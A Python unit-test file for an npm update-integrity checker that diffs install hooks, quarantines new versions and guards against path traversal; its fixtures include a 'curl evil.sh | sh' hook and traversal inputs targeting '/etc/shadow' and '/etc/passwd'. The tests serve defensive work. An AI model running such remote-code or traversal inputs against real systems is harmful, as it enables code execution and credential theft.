"""Unit tests for the update integrity verification module.

Covers the three named plan tests (diff/quarantine) plus edge cases the
implementer wanted to lock in:
- Whitespace-only churn should NOT produce a diff entry.
- Empty-string hooks should be treated as absent.
- Hook order-independence (dict iteration order cannot affect results).
- Quarantine mid-window returns a positive `remaining`.
- `audit_installed_scripts` shape matches the acceptance criterion.
- `osv_batch_query` returns [] on network failure rather than raising.
"""

import os
import sys
import time
import urllib.error
from unittest.mock import patch

import pytest


# Make the plugin directory importable regardless of pytest cwd.
_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import verification  # noqa: E402
from verification import (  # noqa: E402
    QUARANTINE_DEFAULTS,
    ScriptChange,
    audit_installed_scripts_npm,
    diff_scripts,
    is_quarantined,
    osv_batch_query,
)


# ── Layer 3: diff_scripts ────────────────────────────────────────

def test_diff_catches_added_preinstall():
    """Bitwarden-incident shape: new preinstall hook appears in upgrade."""
    old = {"postinstall": "node build.js"}
    new = {"postinstall": "node build.js", "preinstall": "node bw1.js"}
    changes = diff_scripts(old, new, "@bitwarden/cli", "2026.3.0", "2026.4.0")
    assert len(changes) == 1
    assert isinstance(changes[0], ScriptChange)
    assert changes[0].hook == "preinstall"
    assert changes[0].change == "added"
    assert changes[0].new == "node bw1.js"
    assert changes[0].old is None
    assert changes[0].package == "@bitwarden/cli"
    assert changes[0].from_version == "2026.3.0"
    assert changes[0].to_version == "2026.4.0"


def test_diff_whitespace_only_change_is_noop():
    """Leading/trailing whitespace churn must not trigger a user prompt."""
    old = {"postinstall": "node build.js"}
    new = {"postinstall": "  node build.js\n"}
    assert diff_scripts(old, new, "pkg", "1.0.0", "1.0.1") == []


def test_diff_empty_string_treated_as_absent():
    """An empty-string hook body should not count as 'present' — adding
    real content to an empty slot reads as 'added', not 'modified'."""
    old = {"preinstall": ""}
    new = {"preinstall": "curl evil.sh | sh"}
    changes = diff_scripts(old, new, "pkg", "1.0.0", "1.0.1")
    assert len(changes) == 1
    assert changes[0].change == "added"


def test_diff_hook_order_independent():
    """Same hooks in different insertion order must produce same diff."""
    old_a = {"preinstall": "a", "postinstall": "b"}
    old_b = {"postinstall": "b", "preinstall": "a"}
    new_a = {"preinstall": "a", "postinstall": "b", "install": "c"}
    new_b = {"install": "c", "postinstall": "b", "preinstall": "a"}

    diff_ab = diff_scripts(old_a, new_b, "pkg", "1", "2")
    diff_ba = diff_scripts(old_b, new_a, "pkg", "1", "2")
    # Same underlying set of hooks → same number of changes, same hook name.
    assert len(diff_ab) == len(diff_ba) == 1
    assert diff_ab[0].hook == diff_ba[0].hook == "install"
    assert diff_ab[0].change == "added"


def test_diff_removed_and_modified():
    old = {"preinstall": "a", "postinstall": "b", "install": "c"}
    new = {"postinstall": "b-new"}  # preinstall + install removed, postinstall modified
    changes = {c.hook: c for c in diff_scripts(old, new, "pkg", "1", "2")}
    assert changes["preinstall"].change == "removed"
    assert changes["install"].change == "removed"
    assert changes["postinstall"].change == "modified"
    assert changes["postinstall"].old == "b"
    assert changes["postinstall"].new == "b-new"


# ── Layer 2: is_quarantined ──────────────────────────────────────

def test_quarantine_first_seen():
    """A version never observed before → quarantined with full window."""
    quarantined, remaining = is_quarantined("npm", "2026.4.0", {})
    assert quarantined is True
    assert remaining > 0
    assert remaining == QUARANTINE_DEFAULTS["npm"]


def test_quarantine_elapsed():
    """Once the window has elapsed → not quarantined, 0 remaining."""
    first_seen = {"2026.4.0": time.time() - QUARANTINE_DEFAULTS["npm"] - 10}
    quarantined, remaining = is_quarantined("npm", "2026.4.0", first_seen)
    assert quarantined is False
    assert remaining == 0


def test_quarantine_mid_window():
    """Halfway through → still quarantined with positive remaining."""
    half = QUARANTINE_DEFAULTS["npm"] // 2
    first_seen = {"2026.4.0": time.time() - half}
    quarantined, remaining = is_quarantined("npm", "2026.4.0", first_seen)
    assert quarantined is True
    assert 0 < remaining <= QUARANTINE_DEFAULTS["npm"]
    # Allow 5s slack for clock drift between recording and assertion.
    assert abs(remaining - half) < 5


def test_quarantine_disabled_for_unknown_source():
    """Sources not in the defaults table → never quarantined."""
    quarantined, remaining = is_quarantined("apt", "1.0", {})
    assert quarantined is False
    assert remaining == 0


# ── Layer 3: audit_installed_scripts ─────────────────────────────

def test_audit_match_when_read_matches_approved(tmp_path, monkeypatch):
    """When on-disk scripts equal approved → match=True, no divergences."""
    approved = {"postinstall": "node build.js"}
    monkeypatch.setattr(
        verification, "read_installed_scripts_npm", lambda pkg: dict(approved)
    )
    result = audit_installed_scripts_npm("pkg", approved)
    assert result == {"match": True, "divergences": []}


def test_audit_divergence_shape():
    """Divergence list shape matches the acceptance criterion."""
    approved = {"postinstall": "node build.js"}
    with patch.object(
        verification,
        "read_installed_scripts_npm",
        return_value={"postinstall": "node build.js", "preinstall": "evil.sh"},
    ):
        result = audit_installed_scripts_npm("pkg", approved)

    assert result["match"] is False
    assert len(result["divergences"]) == 1
    d = result["divergences"][0]
    assert set(d.keys()) == {"hook", "approved", "actual"}
    assert d["hook"] == "preinstall"
    assert d["approved"] is None
    assert d["actual"] == "evil.sh"


# ── Layer 1: osv_batch_query graceful degradation ────────────────

def test_osv_returns_empty_on_network_failure():
    """Network failure must return [] rather than raise."""
    # Clear the cache so we definitely exercise the network path.
    verification._advisory_cache.clear()

    def boom(*args, **kwargs):
        raise urllib.error.URLError("network down")

    with patch.object(verification.urllib.request, "urlopen", side_effect=boom):
        result = osv_batch_query([("left-pad", "1.0.0")], "npm", timeout=1.0)
    assert result == []


def test_osv_empty_input_returns_empty():
    """No packages to query → no work, no errors."""
    assert osv_batch_query([], "npm") == []


def test_osv_returns_empty_on_malformed_response():
    """Non-JSON response body must not propagate — return []."""
    verification._advisory_cache.clear()

    class _FakeResp:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def read(self):
            return b"<html>not json</html>"

    with patch.object(verification.urllib.request, "urlopen", return_value=_FakeResp()):
        result = osv_batch_query([("left-pad", "1.0.0")], "npm", timeout=1.0)
    assert result == []


# ── fetch_scripts_npm / read_installed_scripts_npm graceful failure ─

def test_fetch_scripts_npm_empty_on_missing_binary(monkeypatch):
    """If `npm` isn't on PATH, fetch returns {} rather than raising."""
    def _raise(*a, **kw):
        raise FileNotFoundError("npm not installed")

    monkeypatch.setattr(verification.subprocess, "run", _raise)
    assert verification.fetch_scripts_npm("left-pad", "1.0.0") == {}


def test_read_installed_scripts_npm_empty_when_file_missing():
    """Reading a nonexistent installed package → {} not FileNotFoundError."""
    assert verification.read_installed_scripts_npm("definitely-not-installed-xyz") == {}


# ── Pass A review fixes ──────────────────────────────────────────

def test_osv_cache_hit_skips_network(monkeypatch):
    """A second call for the same (name, version, ecosystem) must be
    served from cache without any network traffic."""
    verification._advisory_cache.clear()
    verification._advisory_cache[("pkg", "1.0", "npm")] = (time.time(), [])

    called: list[int] = []

    def _record(*a, **kw):
        called.append(1)
        raise AssertionError("should not reach the network")

    monkeypatch.setattr(verification.urllib.request, "urlopen", _record)
    assert osv_batch_query([("pkg", "1.0")], "npm") == []
    assert called == []


def test_read_installed_scripts_npm_rejects_path_traversal():
    """A package name with .. or absolute paths must return {} and must
    never open a file outside the npm global prefix. We prove the latter
    by patching open() to record every path it's asked to open."""
    opened_paths: list[str] = []
    real_open = open

    def _tracking_open(path, *args, **kwargs):
        opened_paths.append(str(path))
        return real_open(path, *args, **kwargs)

    with patch("builtins.open", side_effect=_tracking_open):
        for evil in (
            "../../etc",
            "../../../etc/shadow",
            "/etc/passwd",
            "./foo",
            "foo/../bar",
            "foo/bar/baz",            # two slashes without @-scope
            "@scope/pkg/../evil",     # traversal inside scoped name
            "",
            "foo\x00bar",
            "foo\\bar",
        ):
            assert verification.read_installed_scripts_npm(evil) == {}

    # The guard must short-circuit before any open() call happens.
    assert opened_paths == [], f"open() was called with: {opened_paths}"


def test_read_installed_scripts_npm_accepts_safe_names():
    """Legitimate plain and scoped npm package names must pass the guard.
    We can't assert they read real files (they may or may not be installed
    on this machine), but they must return a dict and never raise."""
    for safe in ("left-pad", "@bitwarden/cli", "typescript", "@types/node"):
        result = verification.read_installed_scripts_npm(safe)
        assert isinstance(result, dict)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
